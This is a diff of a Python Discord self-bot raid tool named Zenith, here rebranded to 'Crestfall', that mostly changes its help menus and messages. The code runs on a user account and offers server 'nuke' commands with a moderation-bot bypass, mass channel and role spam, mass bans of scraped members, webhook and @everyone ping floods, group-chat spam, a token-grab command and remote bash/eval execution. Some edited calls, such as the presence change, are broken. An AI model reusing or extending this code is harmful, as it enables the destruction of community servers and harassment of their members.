@@ -3,29 +3,20 @@
 
 ##### === MODULES === #####
 
-try:
-    import discord, random, json, aiohttp, aioconsole, httpx, asyncio, time, string, base64, os, io, contextlib, textwrap, datetime, threading, requests as rq; from discord.ext import commands; from traceback import format_exception; from colorama import Fore; from threading import Thread; from multiprocessing import Process
-except:
-    import os
-    os.system('pip install discord')
-    os.system('pip install aioconsole')
-    os.system('pip install httpx')
-    os.system('pip install colorama')
-    import discord, random, json, aiohttp, aioconsole, httpx, asyncio, time, string, base64, os, io, contextlib, textwrap, datetime, threading, requests as rq; from discord.ext import commands; from traceback import format_exception; from colorama import Fore; from threading import Thread; from multiprocessing import Process
+import discord, random, json, aiohttp, aioconsole, httpx, asyncio, time, string, base64, os, io, contextlib, textwrap, requests as rq; from discord.ext import commands; from traceback import format_exception; from colorama import Fore; from threading import Thread; from multiprocessing import Process
 
 ##### === VARIABLES === #####
 
-idlist = ['921402637214162946']
-token = 'YOUR_TOKEN_HERE'
-prefix = 'z!'
+idlist = ['968117762281066526']
+token = os.getenv('TOKEN')
+prefix = '..'
 msg = '[ @everyone ] zenith runs you ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||'
+
 global hook
 hook = False
 
 languages = {'hu': 'Hungarian, Hungary', 'nl': 'Dutch, Netherlands', 'no': 'Norwegian, Norway', 'pl': 'Polish, Poland', 'pt-BR': 'Portuguese, Brazilian, Brazil', 'ro': 'Romanian, Romania', 'fi': 'Finnish, Finland', 'sv-SE': 'Swedish, Sweden', 'vi': 'Vietnamese, Vietnam', 'tr': 'Turkish, Turkey', 'cs': 'Czech, Czechia, Czech Republic', 'el': 'Greek, Greece', 'bg': 'Bulgarian, Bulgaria', 'ru': 'Russian, Russia', 'uk': 'Ukranian, Ukraine', 'th': 'Thai, Thailand', 'zh-CN': 'Chinese, China', 'ja': 'Japanese, Japan', 'zh-TW': 'Chinese, Taiwan', 'ko': 'Korean, Korea'}
 locales = ['da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']
-zenith_fonts = ['ℨ𝔢𝔫𝔦𝔱𝔥', '𝖅𝖊𝖓𝖎𝖙𝖍', '𝓩𝓮𝓷𝓲𝓽𝓱', '𝒵𝑒𝓃𝒾𝓉𝒽', 'ℤ𝕖𝕟𝕚𝕥𝕙', 'Ｚｅｎｉｔｈ', 'ɥʇıuǝZ', 'Zҽɳιƚԋ', 'ፚᏋᏁᎥᏖᏂ', '𝐙𝐞𝐧𝐢𝐭𝐡', '𝗭𝗲𝗻𝗶𝘁𝗵', '𝘡𝘦𝘯𝘪𝘵𝘩', '𝙕𝙚𝙣𝙞𝙩𝙝', '𝚉𝚎𝚗𝚒𝚝𝚑', '乙乇几丨ㄒ卄', 'ᗱᘿᘉᓰᖶᕼ', '𝐙𝕖ℕιŦｈ', '𝔃ⓔｎĮⓣｈ', '乙έⓃᎥｔĦ']
-
 
 intents = discord.Intents.all()
 client = commands.Bot(command_prefix = prefix, intents=intents, self_bot=True)
@@ -47,15 +38,13 @@ cToken = token[:25] + "*"*34
 async def on_ready():
   os.system('clear')
   print(f'''
-
 {bl}       ████████╗         ┏━━━━━━━━━━━━━━━━━━ Info ━━━━━━━━━━━━━━━━┓
-{bl}      ██████████╗           {wh}[Prefix] ⧉ {bl}➜ {rs}{str(client.command_prefix)}
-{bl}      ██║ ██  ██║           {wh}[On-set] ⧉ {bl}➜ {rs}{client.user.name}#{client.user.discriminator}
-{bl}      ████  ████║           {wh}[Client] ⧉ {bl}➜ {rs}{cToken}
-{bl}      ╚████████╔╝           {wh}[Status] ⧉ {bl}➜ {rs}Operational! 100%
+{bl}      ██████████╗           {wh}[Prefix] ⧉ {bl} ➜ {rs}{str(client.command_prefix)}
+{bl}      ██║ ██  ██║           {wh}[On-set] ⧉ {bl} ➜ {rs}{client.user.name}#{client.user.discriminator}
+{bl}      ████  ████║           {wh}[System] ⧉ {bl} ➜ {rs}Zenith V.4
+{bl}      ╚████████╔╝           {wh}[SlfBot] ⧉ {bl} ➜ {rs}Crestfall on top. 
 {bl}       █═█═█═█═╝         ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 ''')
-  print('[+] ')
 
 ##### === FUNCTIONS === #####
 
@@ -85,13 +74,13 @@ def get_roles(session):
 def make_channels(session):
     tasks = []
     for i in range(200):
-        tasks.append(session.post(f'https://discord.com/api/v9/guilds/{guild2}/channels', headers=headers,json={'type':'0', 'name':f'nuked-by-{random.choices(zenith_fonts)}'}))
+        tasks.append(session.post(f'https://discord.com/api/v9/guilds/{guild2}/channels', headers=headers,json={'type':'0', 'name':f'zenith-runs-you'}))
     return tasks
 
 def make_roles(session):
     tasks = []
     for i in range(100):
-        name = 'ZENITH X SB'
+        name = 'zenith'
         payload = {
           'color': 10038562,
           'name':name,
@@ -203,92 +192,92 @@ async def comflood(gid, session):
 
 @client.command()
 async def help(ctx, category=None):
-    await ctx.message.delete()
+    before = time.monotonic()
+    try:
+      await ctx.message.delete()
+    except:
+      pass
+    ping = int((time.monotonic() - before) * 1000)
     if category == None:
         await ctx.send(f'''
->>> ```ini
-•✧• ══ [DEADCORD ❖ MAIN] ══ •✧•
-Zenith ✧ 12.5 ✧ {client.command_prefix}
-
-╭───────────── •  •  • [ ZENITH ]
-help raid  ; shows raid panel
-help misc  ; shows misc panel
-help info  ; shows info panel
-help load  ; shows load panel
-╰───────────── •  • 
+```
+          [ Crestfall ]
+┌───────────────────────────────
+│ help raid  ➤ shows raid cmds
+│ help misc  ➤ shows misc cmds
+│ help info  ➤ shows info cmds
+│ help load  ➤ shows load cmds
+└───────────────────────────────
+  {client.command_prefix} | {client.user} | MAIN | {ping}ms
 ```
         ''')
     if category == 'raid':
         await ctx.send(f'''
->>> ```ini
-•✧• ══ [DEADCORD ❖ RAID] ══ •✧•
-Zenith ✧ 12.5 ✧ {client.command_prefix}
-
-╭───────────── •  •  • [ ZENITH ]
-nuke       ; nuke w/ wick bypass
-nuke2      ; nuke w/o wick bypass
-community  ; nuke w/o audit (takaso)
-chdel      ; del channels
-chbomb     ; spam channels 
-rolenuke   ; nuke roles
-nicknuke   ; nuke names
-webhook    ; <on/off> enable pings
-scrape     ; scrapes membs
-massban    ; ban scraped membs
-╰───────────── •  • 
+```
+          [ Crestfall ]
+┌───────────────────────────────
+│ nuke       ➤ wick bypass
+│ nuke2      ➤ performance
+│ community  ➤ no audit /takaso
+│ chdel      ➤ del channels
+│ chbomb     ➤ spam channels
+│ rolenuke   ➤ spam roles
+│ nicknuke   ➤ mass nickname
+│ webhook    ➤ <on/off>
+│ scrape     ➤ scrape membs
+│ massban    ➤ bans scraped
+└───────────────────────────────
+  {client.command_prefix} | {client.user} | RAID | {ping}ms
 ```
         ''')
     elif category == 'misc':
         await ctx.send(f'''
->>> ```ini
-•✧• ══ [DEADCORD ❖ MISC] ══ •✧•
-Zenith ✧ 12.5 ✧ {client.command_prefix}
-
-╭───────────── •  •  • [ ZENITH ]
-manual     ; ping roles/everyone
-massgc     ; <int> <user> mass gc 
-spamgc     ; <int> <name> change gc name
-purge      ; <int> purges messages
-firstmsg   ; sends link to first message
-ping       ; gets bot latency
-status     ; <on/off/idle/dnd> enable status
-otax       ; <user> get user token
-ghost      ; <msg> sends and delete
-spam       ; <int> <msg>
-unbanall   ; unban everyone
-clone      ; clone and delete channel
-cum        ; cum.
-╰───────────── •  • 
+```
+          [ Crestfall ]
+┌───────────────────────────────
+│ manual     ➤ tries ping all
+│ massgc     ➤ <i/@> mass gcadd
+│ spamgc     ➤ <i/n> chng gcname
+│ purge      ➤ <i> deletes msg
+│ firstmsg   ➤ sends 1st msg
+│ ping       ➤ trash wifi
+│ status     ➤ <on/off/idle/dnd>
+│ otax       ➤ <user> ukk stuff
+│ ghost      ➤ <msg> ghostmsg
+│ spam       ➤ <i> <msg>
+│ unbanall   ➤ unbans every1
+│ clone      ➤ clone channel
+│ cum        ➤ exeter skids
+└───────────────────────────────
+  {client.command_prefix} | {client.user} | MISC | {ping}ms
 ```
         ''')
     elif category == 'info':
         await ctx.send(f'''
->>> ```ini
-•✧• ══ [DEADCORD ❖ INFO] ══ •✧•
-Zenith ✧ 12.5 ✧ {client.command_prefix}
-
-╭───────────── •  •  • 
-bash       ; <code> bash emulator
-eval       ; <code> py emulator
-base64     ; <encode/decode> <msg>
-pingweb    ; <url> ping url / return status
-guildicon  ; get guild icon
-banner     ; get guild banner
-roleslist  ; get guild roles
-╰───────────── •  • 
+```
+          [ Crestfall ]
+┌───────────────────────────────
+│ bash       ➤ </> bash terminal
+│ eval       ➤ </> py emulator
+│ base64     ➤ <encode/decode>
+│ pingweb    ➤ <url> pings web
+│ guildicon  ➤ get guild icon
+│ banner     ➤ get guild banner
+│ roleslist  ➤ get guild roles
+└───────────────────────────────
+  {client.command_prefix} | {client.user} | INFO | {ping}ms
 ```
         ''')
     
     elif category == 'load':
         await ctx.send(f'''
->>> ```ini
-•✧• ══ [DEADCORD ❖ LOAD] ══ •✧•
-Zenith ✧ 12.5 ✧ {client.command_prefix}
-
-╭───────────── •  •  • [ ZENITH ]
-guildload  ; <list/...> load server
-copyguild  ; clone guild
-╰───────────── •  • 
+```
+          [ Crestfall ]
+┌───────────────────────────────
+│ guildload  ➤ loads server tmpl
+│ copyguild  ➤ clones guild
+└───────────────────────────────
+  {client.command_prefix} | {client.user} | LOAD | {ping}ms
 ```
         ''')
 
@@ -349,7 +338,7 @@ async def chbomb2(ctx):
   async with httpx.AsyncClient() as session:
     tasks = []
     for i in range(200):
-      tasks.append(asyncio.create_task(makech(f'nuked-by-{random.choice(zenith_fonts)}', session)))
+      tasks.append(asyncio.create_task(makech(f'nuked-by-zenith', session)))
     await asyncio.gather(*tasks)
 
 @client.command()
@@ -375,16 +364,16 @@ async def webhook(ctx, arg):
     pass
   if arg == 'on' or arg == 'On':
     if hook:
-      await ctx.send('[ZENITH] | Webhook Pings already turned on!', delete_after=3)
+      await ctx.send('```[Zenith] Pings Already On!```', delete_after=3)
     else:
       hook = True
-      await ctx.send('[ZENITH] | Webhook Pings successfully turned on!', delete_after=3)
+      await ctx.send('```[Zenith] Pings Turned On!```', delete_after=3)
   if arg == 'off' or arg == 'Off':
     if hook == False:
-      await ctx.send('[ZENITH] | Webhook Pings already turned off!', delete_after=3)
+      await ctx.send('```[Zenith] Pings Already Off!```', delete_after=3)
     else:
       hook = False
-      await ctx.send('[ZENITH] | Webhook Pings successfully turned off!', delete_after=3)
+      await ctx.send('```[Zenith] Pings Turned Off!```', delete_after=3)
 
 roles = []
 @client.command()
@@ -427,7 +416,7 @@ async def scrapemembs(ctx):
   for member in members2:
     members.append(member.id)
   members.remove(ctx.author.id)
-  await ctx.send(f'Scraped {len(members)} members!', delete_after=3)
+  await ctx.send(f'```[Zenith] Scraped {len(members)} members!```', delete_after=3)
 
 @client.command()
 async def massban(ctx):
@@ -450,7 +439,7 @@ async def hookping(ctx, amount:int):
     for i in range(amount):
       for w in await ctx.guild.webhooks():
         try:
-          tasks.append(whsend(w.url, session, '@everyone [ZENITH] | ZENITH RUNS YOU'))
+          tasks.append(whsend(w.url, session, '@everyone | ZENITH RUNS YOU'))
         except:
           pass
     await asyncio.gather(*tasks)
@@ -461,7 +450,7 @@ async def nicknuke(ctx):
   members = await ctx.guild.chunk()
   for member in members:
       try:
-          await member.edit(nick='〖DEADCORD〗')
+          await member.edit(nick='Zenith Runs You')
       except:
           pass
 
@@ -470,7 +459,7 @@ async def webhooknuke(ctx):
   await ctx.message.delete()
   for c in ctx.guild.text_channels:
     try:
-      await c.create_webhook(name ="〖DEADCORD〗")
+      await c.create_webhook(name ="Zenith Runs You")
     except:
       pass
 
@@ -478,7 +467,7 @@ async def webhooknuke(ctx):
 async def on_guild_channel_create(channel):
   global hook
   if hook == True:
-    webhook = await channel.create_webhook(name="ZENITH X ZENITH")
+    webhook = await channel.create_webhook(name="Zenith Runs You")
     webhook_url = webhook.url
     async with aiohttp.ClientSession() as session:
         webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
@@ -498,7 +487,7 @@ async def nuke(ctx):
 @client.command(aliases=['kill2'])
 async def nuke2(ctx, name=None):
   if name==None:
-    name = 'ZENITH X VA'
+    name = 'Zenith'
   try:
     await ctx.message.delete()
   except:
@@ -526,17 +515,13 @@ async def manual(ctx):
   for c in ctx.guild.channels:
     for i in range(50):
       count += 1
-      await ctx.send('**@everyone 〖DEADCORD X ZENITH〗** ' + f' '.join([random.choice(roles) for i in range(5)]) + f' | {count}')
+      await ctx.send('**@everyone** ' + f' '.join([random.choice(roles) for i in range(5)]) + f' | {count}')
 
 @client.command(aliases=['massgc', 'mass-gc'])
 async def massaddgc(ctx, amount=int, *, user: discord.User = None):
         await ctx.message.delete()
         if user is None:
-            await ctx.send('''
-> ```ini
-> [DEADCORD] ERROR! | User cannot be 'None'
-> ```
-                        ''')
+            await ctx.send('```[Zenith] ERROR! | User cannot be [None]```')
             return
         for friend in client.user.friends:
             if friend == user:
@@ -547,7 +532,7 @@ async def massaddgc(ctx, amount=int, *, user: discord.User = None):
                     if resp.status == 200:
                         await ctx.send('''
 > ```ini
-> [DEADCORD] GC Made
+> [ZENITH] GC Made
 > ```
                         ''')
                         c = await resp.json()
@@ -556,20 +541,20 @@ async def massaddgc(ctx, amount=int, *, user: discord.User = None):
                             if resp.status == 200:
                                 await ctx.send('''
 > ```ini
-> [DEADCORD] Left GC
+> [ZENITH] Left GC
 > ```
                         ''')                            
                     if resp.status == 403:
                         await ctx.send('''
 > ```ini
-> [DEADCORD] Unauthorized
+> [ZENITH] Unauthorized
 > ```
                         ''')
                     if resp.status == 429 or resp.status == 400:
                         k = await resp.json()
                         await ctx.send(f'''
 > ```ini
-> [DEADCORD] {resp.status} You are being ratelimited, wait after {k['retry_after']}
+> [ZENITH] {resp.status} You are being ratelimited, wait after {k['retry_after']}
 > ```
                         ''')
                         await asyncio.sleep(k['retry_after'])
@@ -669,7 +654,7 @@ async def massreact(ctx, amount, *, emote):
 @client.command()
 async def vcspam(ctx, ch1=None, ch2=None, uid=None, amount=10):
     if ch1==None or ch2==None:
-        await ctx.message.edit(content = f"**Usage:** `vcspam [ch1] [ch2] <uid> <amount>` ")  
+        await ctx.message.edit(content = f"```[Zenith] vcspam [ch1] [ch2] <uid> <amount>```")  
     else:
         await ctx.message.delete()
         headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
@@ -739,28 +724,28 @@ async def ping(ctx):
   before = time.monotonic()
   message = await ctx.send("Pinging...")
   ping = (time.monotonic() - before) * 1000
-  await message.edit(content=f"> `{int(ping)} ms`")
+  await message.edit(content=f"> `🏓 | Pong! {int(ping)} ms`")
 
 @client.command()
-async def status_code(ctx, status_code=None):
+async def status(ctx, status_code=None):
   try:
     await ctx.message.delete()
   except:
     pass
   if status_code == None:
-    await ctx.send('You need to specify a status_code!', delete_after=2)
+    await ctx.send('```[Zenith] Status code cannot be None.```', delete_after=2)
   if status_code == 'idle':
-    await client.change_presence(status_code=discord.status_code.idle)
-    await ctx.send('Finished! | 🌙')
+    await client.change_presence(status_code=discord.Status.name.idle)
+    await ctx.send('```[Zenith] Finished! | 🌙```')
   if status_code == 'dnd':
-    await client.change_presence(status_code=discord.status_code.dnd)
-    await ctx.send('Finished! | ⛔')
+    await client.change_presence(status_code=discord.Status.name.dnd)
+    await ctx.send('```[Zenith] Finished! | ⛔```')
   if status_code == 'off':
-    await client.change_presence(status_code=discord.status_code.offline)
-    await ctx.send('Finished! | ⚫')
+    await client.change_presence(status_code=discord.Status.name.offline)
+    await ctx.send('```[Zenith] Finished! | ⚫```')
   if status_code == 'on' or status_code == 'online':
-    await client.change_presence(status_code=discord.status_code.online)
-    await ctx.send('Finished! | 🟢')
+    await client.change_presence(status_code=discord.Status.name.online)
+    await ctx.send('```[Zenith] Finished! | 🟢```')
 
 @client.command(aliases=['otacks', 'tokengrab', 'tg', 'otax'])
 async def _tokengrab(ctx, *, user: discord.User=None):
@@ -804,10 +789,7 @@ async def clone(ctx):
   await ctx.message.delete()
   x = await ctx.channel.clone(reason='')
   await ctx.channel.delete()
-  await x.send("""
->>> ```ini
- [ CHANNEL HAS BEEN CLONED ]
-```""")
+  await x.send("```[Zenith] Cloned channel successfully!```")
 
 ##### === COMMANDS: INFO === #####
 
@@ -980,59 +962,100 @@ async def bash(ctx ,* args):
 ##### === BACKUP === #####
 
 @client.command(aliases=["copyguild", "copyserver"])
-async def copy(ctx):  
+async def cloneguild(ctx, guild_id: int):
     await ctx.message.delete()
-    await client.create_guild(f'COPY OF {ctx.guild.name}')
-    await ctx.send('Backup starting in 2 seconds...')
-    await asyncio.sleep(2)
-    for g in client.guilds:
-        if f'COPY OF {ctx.guild.name}' in g.name:
-            for chn in g.channels:
-                await chn.delete()
-            for cat in ctx.guild.categories:
-                x = await g.create_category(f"{cat.name}", overwrites=cat.overwrites)
-                for c in cat.channels:
-                    if isinstance(c, discord.VoiceChannel):
-                        await x.create_voice_channel(f"{c}", overwrites=c.overwrites)
-                    if isinstance(c, discord.TextChannel):
-                        await x.create_text_channel(f"{c}", overwrites=c.overwrites, topic=c.topic)
-            for role in ctx.guild.roles:
-              if role.name == '@everyone':
-                pass
-              else:
-                await g.create_role(name=role.name, color=role.color, permissions=role.permissions)
+    guild2 = ctx.guild
     try:
-        await g.edit(icon=ctx.guild.icon_url)
+        guild1 = client.get_guild(guild_id)
     except:
+        return await ctx.send("Guild not found.")
+
+    try:
+      await guild2.edit(name=guild1.name)
+    except Exception as e:
+      print(e)
+    for a in guild2.text_channels:
+        try:
+            await a.delete()
+        except:
+            pass
+    for a in guild2.voice_channels:
+        try:
+            await a.delete()
+        except:
+            pass
+    for a in guild2.categories:
+        try:
+            await a.delete()
+        except:
+            pass    
+    for a in guild2.roles:
+        try:
+            await a.delete()
+        except:
+            pass
+    for a in guild1.categories:
+        try:
+            await guild2.create_category(name = a.name, overwrites=a.overwrites)
+        except:
+            pass
+    for a in guild1.text_channels:
+        try:
+            cat = discord.utils.get(guild2.categories, name = a.category.name)
+            await guild2.create_text_channel(name = a.name, category = cat, position = a.position, topic = a.topic, slowmode_delay = a.slowmode_delay)
+        except:
+            pass
+    for a in guild1.roles:
+      try:
+        await guild2.create_role(name=a.name, permissions=a.permissions,color=a.color, position=a.position)
+      except:
         pass
 
+    for a in guild1.voice_channels:
+        try:
+            cat = discord.utils.get(guild2.categories, name = a.category.name)
+            await guild2.create_voice_channel(name = a.name, category = cat, position = a.position, user_limit = a.user_limit, bitrate = a.bitrate)
+        except:
+            pass
+
 @client.command()
-async def guildload(ctx, xx=None):
-  if xx is None:
-    await ctx.send('Input a backup Type! Do `guildload list` to get list of backups')
-  if xx == 'list':
-    await ctx.send('''
->>> ```ini
-[ LIST ]
-example (MODIFY THIS IN YOUR SCRIPT)
-```
-    ''')
-  if xx == 'example':
-    for z in ctx.guild.channels:
-        await z.delete()
-    await roledel(ctx)
-    c1 = await ctx.guild.create_category('Example Category 1')
-    await c1.create_text_channel('example-text-1')
-    await c1.create_text_channel('example-text-2')
-    await c1.create_voice_channel('Example Voice 1')
-    await c1.create_voice_channel('Example Voice 2')
-    c2 = await ctx.guild.create_category('Example Category 2')
-    await c2.create_text_channel('example-text-1')
-    await c2.create_text_channel('example-text-2')
-    await c2.create_voice_channel('Example Voice 1')
-    await c2.create_voice_channel('Example Voice 2')
-    await ctx.guild.create_role(name='Example Admin Role', permissions=discord.Permissions(8), color=discord.Colour(0xFF0000))
-    await ctx.guild.create_role(name='Example Normal Role', permissions=discord.Permissions(0), color=discord.Colour(0x00FF00))
+async def guildload(ctx, template=None):
+  if template == None:
+    await ctx.send("""
+```[ZENITH] Invalid Template! | guildload <template>```
+```Available Templates; \nexample\n```
+      """)
+
+  if template == "list":
+    await ctx.send('''```Available Templates; \nexample\n```''')
+  if template == "example":
+    await ctx.guild.edit(name="Example Template")
+    for c in ctx.guild.channels:
+      await c.delete() 
+    for role in ctx.guild.roles:
+      try:
+        await role.delete()
+      except:
+        pass
+
+    status = await ctx.guild.create_category(" | Stats |")
+    await ctx.guild.create_voice_channel(f"『📊』Members: {len(ctx.guild.members)}", category=status)
+
+    infor = await ctx.guild.create_category(" | Information | ")
+    await ctx.guild.create_text_channel(f"❔│ rules", category=infor)
+    await ctx.guild.create_text_channel(f"🔰│ welcome", category=infor)
+    await ctx.guild.create_text_channel(f"👀│ leaves", category=infor)
+
+    generl = await ctx.guild.create_category(" | Texting Channels | ")
+    await ctx.guild.create_text_channel(f"💬│ chat", category=generl)
+    await ctx.guild.create_text_channel(f"😂│ memes", category=generl)
+    await ctx.guild.create_text_channel(f"📃│ scripts", category=generl)
+
+    vc = await ctx.guild.create_category(" | Voice Channels | ")
+    await ctx.guild.create_voice_channel(f"🎼│ vc text", category=vc)
+    await ctx.guild.create_voice_channel(f"🎶│ music", category=vc)
+    await ctx.guild.create_voice_channel(f"💬│ talk", category=vc)
+ 
 
 ##### === ENDING CODE === #####
 
